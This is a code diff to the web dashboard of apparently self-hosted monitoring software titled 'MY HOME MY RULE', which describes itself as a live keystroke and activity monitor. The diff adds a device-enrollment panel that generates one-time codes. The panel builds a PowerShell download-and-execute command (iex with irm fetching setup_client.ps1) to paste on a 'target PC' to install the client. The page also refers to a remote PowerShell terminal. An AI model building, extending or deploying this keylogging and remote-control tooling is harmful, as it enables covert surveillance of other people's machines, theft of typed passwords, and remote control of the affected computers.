@@ -1303,7 +1303,16 @@ HTML_TEMPLATE = """<!DOCTYPE html>
         }
         
         /* Adjust for smaller screens */
+        .enroll-grid {
+            display: grid;
+            grid-template-columns: auto 1fr;
+            gap: 1.5rem;
+            align-items: center;
+        }
         @media (max-width: 640px) {
+            .enroll-grid {
+                grid-template-columns: 1fr !important;
+            }
             .modal-arrow {
                 width: 44px;
                 height: 44px;
@@ -1320,7 +1329,7 @@ HTML_TEMPLATE = """<!DOCTYPE html>
 <body>
     <!-- Landing Page (Monitored Devices Grid) -->
     <div id="landing-page" class="container view-screen">
-        <header style="margin-bottom: 2.5rem;">
+        <header style="margin-bottom: 2rem;">
             <div>
                 <h1>MY HOME MY RULE</h1>
                 <p style="color: var(--text-muted); font-size: 0.9rem; margin-top: 0.25rem;">Live Keystroke & Activity Monitor - Monitored Devices Overview</p>
@@ -1336,20 +1345,69 @@ HTML_TEMPLATE = """<!DOCTYPE html>
                 </a>
             </div>
         </header>
+
+        <!-- Live Auto-Refreshing Enrollment Widget -->
+        <div style="background: linear-gradient(135deg, rgba(30, 41, 59, 0.7) 0%, rgba(15, 23, 42, 0.9) 100%); border: 1px solid rgba(56, 189, 248, 0.3); border-radius: 12px; padding: 1.5rem; margin-bottom: 2rem; box-shadow: 0 8px 32px rgba(0,0,0,0.4); display: flex; flex-direction: column; gap: 1rem;">
+            <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 0.75rem; border-bottom: 1px solid rgba(255,255,255,0.08); padding-bottom: 0.85rem;">
+                <div style="display: flex; align-items: center; gap: 0.6rem;">
+                    <span class="live-dot" style="background:#38bdf8; width:10px; height:10px; box-shadow:0 0 10px #38bdf8;"></span>
+                    <span style="font-size: 1rem; font-weight: 700; color: #f8fafc; letter-spacing: -0.2px;">Quick Device Registration</span>
+                    <span style="background: rgba(56, 189, 248, 0.15); color: #38bdf8; font-size: 0.72rem; padding: 2px 8px; border-radius: 9999px; font-weight: 600; border: 1px solid rgba(56, 189, 248, 0.3);">AUTO-REFRESHING OTP</span>
+                </div>
+                <div style="display: flex; align-items: center; gap: 0.75rem;">
+                    <span style="font-size: 0.82rem; color: var(--text-muted);">Refreshes in:</span>
+                    <span id="banner-otp-timer" style="font-family: monospace; font-size: 0.95rem; font-weight: 700; color: #f59e0b; background: rgba(245, 158, 11, 0.1); padding: 2px 8px; border-radius: 4px; border: 1px solid rgba(245, 158, 11, 0.25);">10:00</span>
+                    <button onclick="refreshBannerOtp()" style="background: rgba(255,255,255,0.06); border: 1px solid var(--border); color: #e2e8f0; font-size: 0.78rem; padding: 0.35rem 0.75rem; border-radius: 6px; cursor: pointer; display: flex; align-items: center; gap: 0.35rem; transition: all 0.2s;" title="Force generate new OTP now">
+                        <svg style="width:12px;height:12px;" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 1121.21 4.79M9 9h9v9"></path></svg>
+                        Refresh OTP
+                    </button>
+                </div>
+            </div>
+
+            <div class="enroll-grid">
+                <!-- OTP Display Box -->
+                <div style="background: #0b1120; border: 1px solid rgba(56, 189, 248, 0.3); border-radius: 10px; padding: 1rem 1.5rem; text-align: center; min-width: 170px;">
+                    <div style="font-size: 0.7rem; text-transform: uppercase; letter-spacing: 1.5px; color: #94a3b8; margin-bottom: 0.3rem; font-weight: 600;">Setup OTP</div>
+                    <div id="banner-otp-display" style="font-family: 'Cascadia Code', Consolas, monospace; font-size: 2rem; font-weight: 800; letter-spacing: 6px; color: #38bdf8;">------</div>
+                    <div style="font-size: 0.68rem; color: #64748b; margin-top: 0.25rem;">Live code (auto-updates)</div>
+                </div>
+
+                <!-- Command Box -->
+                <div style="display: flex; flex-direction: column; gap: 0.45rem;">
+                    <div style="display: flex; justify-content: space-between; align-items: center;">
+                        <span style="font-size: 0.82rem; font-weight: 600; color: #e2e8f0;">PowerShell Command for Client Machine:</span>
+                        <span style="font-size: 0.75rem; color: #94a3b8;">Run in PowerShell on target PC</span>
+                    </div>
+                    <div style="display: flex; gap: 0.5rem; align-items: center;">
+                        <input type="text" id="banner-otp-cmd" readonly onclick="this.select()"
+                            style="flex: 1; background: #0b1120; border: 1px solid #334155; padding: 0.65rem 0.85rem; border-radius: 8px; color: #38bdf8; font-family: 'Cascadia Code', Consolas, monospace; font-size: 0.82rem; outline: none;"
+                            value="Generating command...">
+                        <button onclick="copyBannerCmd()" id="banner-copy-btn"
+                            style="background: var(--accent); border: none; color: #fff; padding: 0.65rem 1.25rem; border-radius: 8px; font-size: 0.85rem; font-weight: 600; cursor: pointer; white-space: nowrap; transition: all 0.2s; display: flex; align-items: center; gap: 0.4rem; box-shadow: 0 4px 12px rgba(37,99,235,0.4);">
+                            <svg style="width:14px;height:14px;" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"></path></svg>
+                            Copy Command
+                        </button>
+                    </div>
+                    <div id="banner-status-text" style="font-size: 0.76rem; color: #94a3b8; display: flex; align-items: center; gap: 0.4rem;">
+                        <span>💡 Paste this command into PowerShell on any client machine to install & connect it.</span>
+                    </div>
+                </div>
+            </div>
+        </div>
         
         <h2 style="font-size: 1.2rem; font-weight: 600; margin-bottom: 1.5rem; color: var(--text-muted); display: flex; align-items: center; justify-content: space-between;">
             <div style="display: flex; align-items: center; gap: 0.5rem;">
                 Monitored Devices
                 <span id="device-count-badge" style="background-color: var(--bg-card); color: var(--text-main); font-size: 0.8rem; padding: 0.15rem 0.5rem; border-radius: 9999px; border: 1px solid var(--border);">0</span>
             </div>
-            <button onclick="openOtpModal()" style="background: var(--accent); border: none; color: #fff; padding: 0.45rem 1rem; border-radius: 6px; font-size: 0.85rem; font-weight: 600; cursor: pointer; display: flex; align-items: center; gap: 0.4rem; box-shadow: 0 2px 8px rgba(37,99,235,0.3);">
+            <button onclick="refreshBannerOtp()" style="background: var(--accent); border: none; color: #fff; padding: 0.45rem 1rem; border-radius: 6px; font-size: 0.85rem; font-weight: 600; cursor: pointer; display: flex; align-items: center; gap: 0.4rem; box-shadow: 0 2px 8px rgba(37,99,235,0.3);">
                 <svg style="width: 16px; height: 16px;" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 4v16m8-8H4"></path></svg>
-                + Add Device
+                New OTP
             </button>
         </h2>
         
         <div id="devices-grid" style="display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 1.5rem;">
-            <div class="no-data" style="grid-column: 1 / -1;">Loading monitored devices...</div>
+            <div class="no-data" style="grid-column: 1 / -1;">No monitored devices enrolled yet. Run the registration command above to connect a PC.</div>
         </div>
     </div>
 
@@ -2010,6 +2068,98 @@ HTML_TEMPLATE = """<!DOCTYPE html>
             const btn = document.getElementById('otp-copy-btn');
             btn.innerText = 'Copied!';
             setTimeout(() => { btn.innerText = 'Copy'; }, 2000);
+        }
+
+        // ==================== LIVE AUTO-REFRESHING BANNER OTP ====================
+        let bannerOtp = '';
+        let bannerOtpCountdown = 600;
+        let bannerOtpTimer = null;
+        let bannerOtpPoll = null;
+
+        async function initBannerOtp() {
+            await refreshBannerOtp();
+        }
+
+        async function refreshBannerOtp() {
+            if (bannerOtpTimer) clearInterval(bannerOtpTimer);
+            if (bannerOtpPoll) clearInterval(bannerOtpPoll);
+
+            const display = document.getElementById('banner-otp-display');
+            const timerEl = document.getElementById('banner-otp-timer');
+            const cmdInput = document.getElementById('banner-otp-cmd');
+            const statusEl = document.getElementById('banner-status-text');
+            const copyBtn = document.getElementById('banner-copy-btn');
+
+            if (!display) return;
+            display.innerText = '......';
+            if (timerEl) { timerEl.innerText = '10:00'; timerEl.style.color = '#f59e0b'; }
+            if (copyBtn) { copyBtn.innerHTML = '<svg style="width:14px;height:14px;" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"></path></svg> Copy Command'; }
+
+            try {
+                const res = await fetch('/api/otp/generate', { method: 'POST' });
+                const data = await res.json();
+                if (data.status === 'success') {
+                    bannerOtp = data.otp;
+                    display.innerText = bannerOtp;
+                    const origin = window.location.origin;
+                    const cmd = `iex (irm '${origin}/api/client/update/setup_client.ps1?otp=${bannerOtp}')`;
+                    if (cmdInput) cmdInput.value = cmd;
+                    if (statusEl) statusEl.innerHTML = '<span>💡 Run this in PowerShell on any Windows machine to install and pair it automatically.</span>';
+
+                    bannerOtpCountdown = data.expires_in || 600;
+                    bannerOtpTimer = setInterval(updateBannerOtpTimer, 1000);
+                    bannerOtpPoll = setInterval(pollBannerOtpStatus, 3000);
+                } else {
+                    if (statusEl) statusEl.innerText = 'Failed to generate OTP: ' + (data.error || 'Unknown error');
+                }
+            } catch (err) {
+                if (statusEl) statusEl.innerText = 'Network error fetching OTP: ' + err.message;
+            }
+        }
+
+        function updateBannerOtpTimer() {
+            bannerOtpCountdown--;
+            const timerEl = document.getElementById('banner-otp-timer');
+            if (bannerOtpCountdown <= 0) {
+                if (timerEl) { timerEl.innerText = 'Refreshing...'; timerEl.style.color = '#38bdf8'; }
+                refreshBannerOtp();
+                return;
+            }
+            if (timerEl) {
+                const mins = Math.floor(bannerOtpCountdown / 60);
+                const secs = bannerOtpCountdown % 60;
+                timerEl.innerText = `${mins}:${secs < 10 ? '0' : ''}${secs}`;
+            }
+        }
+
+        async function pollBannerOtpStatus() {
+            if (!bannerOtp) return;
+            try {
+                const res = await fetch(`/api/otp/status?otp=${bannerOtp}`);
+                const data = await res.json();
+                if (data.status === 'consumed') {
+                    if (bannerOtpPoll) { clearInterval(bannerOtpPoll); bannerOtpPoll = null; }
+                    if (bannerOtpTimer) { clearInterval(bannerOtpTimer); bannerOtpTimer = null; }
+                    const statusEl = document.getElementById('banner-status-text');
+                    if (statusEl) statusEl.innerHTML = '<b style="color:#10b981;">✓ New client machine paired and connected successfully!</b>';
+                    fetchDevices();
+                    setTimeout(refreshBannerOtp, 5000);
+                }
+            } catch (e) {}
+        }
+
+        function copyBannerCmd() {
+            const input = document.getElementById('banner-otp-cmd');
+            if (!input) return;
+            input.select();
+            navigator.clipboard.writeText(input.value);
+            const btn = document.getElementById('banner-copy-btn');
+            if (btn) {
+                btn.innerHTML = '✓ Copied!';
+                setTimeout(() => {
+                    btn.innerHTML = '<svg style="width:14px;height:14px;" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"></path></svg> Copy Command';
+                }, 2000);
+            }
         }
 
         // ==================== REMOTE POWERSHELL TERMINAL ====================
@@ -2866,6 +3016,7 @@ HTML_TEMPLATE = """<!DOCTYPE html>
                 changeDatePreset(datePreset);
             }
             
+            initBannerOtp();
             await fetchDevices();
             
             // Restore navigation view state
